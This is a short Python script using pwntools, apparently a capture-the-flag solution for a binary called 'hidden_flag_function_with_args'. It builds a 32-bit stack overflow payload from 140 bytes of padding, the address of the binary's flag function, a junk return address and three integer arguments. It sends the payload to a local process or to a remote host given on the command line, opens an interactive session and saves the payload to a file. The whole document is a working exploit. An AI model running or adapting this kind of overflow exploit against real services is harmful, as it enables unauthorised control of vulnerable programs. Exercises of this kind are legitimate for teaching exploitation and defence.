from pwn import * 

elf = context.binary = ELF("./hidden_flag_function_with_args")
context.log_level = "DEBUG"

if len(sys.argv) < 2:
   r = process(elf.path)
else:
   r = remote(*(sys.argv[1].split(":"))) 

payload = b"A" * 140
payload += p32(elf.sym.flag)
payload += b'junk'
payload += p32(4919)
payload += p32(583)
payload += p32(305419896)

r.sendlineafter(b":", payload)
r.interactive()

with open("payload.txt", "wb") as r:
    r.write(payload)